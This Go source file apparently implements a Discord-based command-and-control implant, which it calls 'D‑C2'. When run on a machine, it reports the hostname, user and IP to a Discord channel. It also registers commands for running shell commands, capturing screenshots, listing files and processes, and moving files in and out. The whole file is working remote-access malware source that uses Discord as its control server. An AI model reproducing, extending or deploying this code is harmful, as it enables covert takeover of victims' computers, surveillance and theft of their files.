package main

import (
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"os/user"
	"runtime"
	"strings"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
)

func main() {
	loadEnvFile(".env")
	guildID = os.Getenv("DISCORD_GUILD_ID")
	token := os.Getenv("DISCORD_BOT_TOKEN")
	if token == "" || guildID == "" {
		log.Printf("missing DISCORD_BOT_TOKEN or DISCORD_GUILD_ID")
		return
	}
	dg, err := discordgo.New("Bot " + token)
	if err != nil {
		log.Printf("failed to create Discord session: %v", err)
		return
	}

	dg.AddHandler(handler)
	dg.AddHandler(handleInteraction)
	dg.Identify.Intents = discordgo.IntentsGuildMessages

	err = dg.Open()
	if err != nil {
		log.Printf("failed to open Discord session: %v", err)
		return
	}

	commands := []*discordgo.ApplicationCommand{
		{
			Name:        "help",
			Description: "Show D‑C2 help menu for this device channel",
		},
		{
			Name:        "cmd",
			Description: "Run a shell command on this device",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "command",
					Description: "Shell command to run",
					Required:    true,
				},
			},
		},
		{
			Name:        "screenshot",
			Description: "Capture screenshots of all displays on this device",
		},
		{
			Name:        "cwd",
			Description: "Show current working directory on this device",
		},
		{
			Name:        "ls",
			Description: "List a directory on this device",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "path",
					Description: "Directory to list (empty for current directory)",
					Required:    false,
				},
			},
		},
		{
			Name:        "ps",
			Description: "List running processes on this device",
		},
		{
			Name:        "pidinfo",
			Description: "Show information about a specific process ID",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionInteger,
					Name:        "pid",
					Description: "Process ID to inspect",
					Required:    true,
				},
			},
		},
		{
			Name:        "download",
			Description: "Download a file from this device",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "source",
					Description: "Source file path on this device",
					Required:    true,
				},
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "destination",
					Description: "Destination label (for your reference)",
					Required:    false,
				},
			},
		},
		{
			Name:        "upload",
			Description: "Upload an attachment to this device",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionAttachment,
					Name:        "source",
					Description: "Source attachment to upload",
					Required:    true,
				},
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "destination",
					Description: "Destination file path on this device",
					Required:    true,
				},
			},
		},
	}

	existingCommands, err := dg.ApplicationCommands(dg.State.User.ID, guildID)
	if err != nil {
		log.Printf("failed to list existing application commands: %v", err)
	} else {
		existingNames := make(map[string]bool, len(existingCommands))
		for _, c := range existingCommands {
			existingNames[c.Name] = true
		}
		for _, cmd := range commands {
			if existingNames[cmd.Name] {
				continue
			}
			_, cmdErr := dg.ApplicationCommandCreate(dg.State.User.ID, guildID, cmd)
			if cmdErr != nil {
				log.Printf("failed to register command %s: %v", cmd.Name, cmdErr)
			}
		}
	}

	rand.Seed(time.Now().UnixNano())
	currentUser, _ := user.Current()
	hostname, _ := os.Hostname()

	ipStr := "unknown"
	ifaces, err := net.Interfaces()
	if err == nil {
		for _, iface := range ifaces {
			if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
				continue
			}
			addrs, err := iface.Addrs()
			if err != nil {
				continue
			}
			for _, addr := range addrs {
				var ip net.IP
				switch v := addr.(type) {
				case *net.IPNet:
					ip = v.IP
				case *net.IPAddr:
					ip = v.IP
				}
				if ip == nil || ip.IsLoopback() {
					continue
				}
				ip = ip.To4()
				if ip == nil {
					continue
				}
				ipStr = ip.String()
				break
			}
			if ipStr != "unknown" {
				break
			}
		}
	}
	sessionId := fmt.Sprintf("%s | %s | %s", hostname, currentUser.Username, ipStr)
	cwd, _ := os.Getwd()
	var categoryName string
	switch runtime.GOOS {
	case "windows":
		categoryName = "windows"
	case "linux":
		categoryName = "linux"
	case "darwin":
		categoryName = "mac"
	default:
		categoryName = "other"
	}
	log.Printf("detected OS=%s, assigning category=%s", runtime.GOOS, categoryName)
	categoryID, err := getOrCreateCategory(dg, categoryName)
	if err != nil {
		log.Printf("failed to ensure category %s: %v", categoryName, err)
		return
	}
	channelName := makeChannelName(hostname, currentUser.Username)
	log.Printf("ensuring device channel %s", channelName)
	channelID, err := getOrCreateDeviceChannel(dg, categoryID, channelName)
	if err != nil {
		log.Printf("failed to ensure device channel %s: %v", channelName, err)
		return
	}
	myChannelId = channelID

	// Send first message with enhanced banner-style info (and pin it)
	osLabel := ""
	switch runtime.GOOS {
	case "windows":
		osLabel = "🪟 Windows"
	case "linux":
		osLabel = "🐧 Linux"
	case "darwin":
		osLabel = "🍎 macOS"
	default:
		osLabel = "💻 " + runtime.GOOS
	}

	firstMsg := fmt.Sprintf(
		"🛰️ New device connected!\n\n"+
			"🧾 Session: *%s*\n"+
			"🌐 IP: `%s`\n"+
			"🙍 User: `%s`\n"+
			"🖥️ Hostname: `%s`\n"+
			"💽 OS: %s\n"+
			"🔧 Arch: `%s`\n"+
			"📂 CWD: `%s`",
		sessionId,
		ipStr,
		currentUser.Username,
		hostname,
		osLabel,
		runtime.GOARCH,
		cwd,
	)
	m, _ := dg.ChannelMessageSend(myChannelId, firstMsg)
	dg.ChannelMessagePin(myChannelId, m.ID)

	// Bot is now running (CTRL+C to quit)
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
	<-sc

	dg.Close()
}

func makeChannelName(hostname, username string) string {
	base := strings.ToLower(hostname + "-" + username)
	var b strings.Builder
	prevDash := false
	for _, r := range base {
		if (r >= 'a' && r <= 'z') || (r >= '0' && r <= '9') {
			b.WriteRune(r)
			prevDash = false
		} else {
			if !prevDash {
				b.WriteRune('-')
				prevDash = true
			}
		}
	}
	name := strings.Trim(b.String(), "-")
	if name == "" {
		name = "device"
	}
	if len(name) > 90 {
		name = name[:90]
	}
	return name
}
